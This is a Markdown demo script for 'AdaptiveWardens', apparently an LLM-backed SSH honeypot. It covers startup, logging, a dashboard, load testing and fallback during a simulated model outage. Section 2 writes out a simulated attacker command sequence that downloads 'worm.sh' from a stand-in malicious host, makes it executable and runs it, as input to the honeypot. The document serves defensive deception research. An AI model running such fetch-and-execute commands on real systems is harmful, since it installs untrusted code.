# AdaptiveWardens Demo Script

This script walks through the presentation of the AdaptiveWardens system, highlighting its realism, observability, and robust fallback architecture.

## 1. Quick Start & Execution (0:00 - 1:00)
**Action**: Start the system via standard deployment wrappers.
```bash
cp .env.example .env
./start.sh
```
*Discussion*: Emphasize the micro-service architecture and the automated sanity checks mapping the API nodes together internally.

## 2. Interactive SSH Attack (1:00 - 3:00)
**Action**: Drop into the honeypot mimicking real-world behavior.
```bash
ssh root@localhost -p 2222
# password: root123
whoami
uname -a
ls -la /var/log
```
*Discussion*: Point out the extreme speed of static queries executing internally in `<50ms` against the SQLite filesystem representations.

**Action**: Trigger an AI/Fallback response.
```bash
wget http://malicious.com/worm.sh
chmod +x worm.sh
./worm.sh
```
*Discussion*: Emphasize the realistic server downloads and responses simulated instantly by Google Gemini to coax attackers further down the interaction funnel.

## 3. Logs & Observability (3:00 - 4:00)
**Action**: Verify trace tracking in a secondary terminal.
```bash
docker-compose logs -f ssh-frontend
```
*Discussion*: Show the real-time Python structured logging identifying `session_id`, tracking MITRE techniques mapped asynchronously.

## 4. Dashboard Visualization (4:00 - 5:00)
**Action**: Navigate to `http://localhost:3000` locally.
*Discussion*: Detail the IOC extraction mechanisms and session metadata visually aggregated without interfering with the sandbox storage tier natively.

## 5. Stress Testing (5:00 - 6:00)
**Action**: Expose the true resilience metrics natively scaling without failure limits.
```bash
./scripts/load_test_ssh.py -c 10 -n 100
cat docs/performance.md
```
*Discussion*: Showcase the robust concurrency handled gracefully by standard Docker instances backed by WAL-mode databases.

## 6. Simulated Outage (6:00 - 7:00)
**Action**: Terminate the core LLM driver artificially.
```bash
./scripts/simulate_failure.sh
```
*Discussion*: Monitor the logs to verify that within 10-15 seconds the system safely relies purely upon default fallback heuristics without terminating a single active attacker session or causing an arbitrary crash.
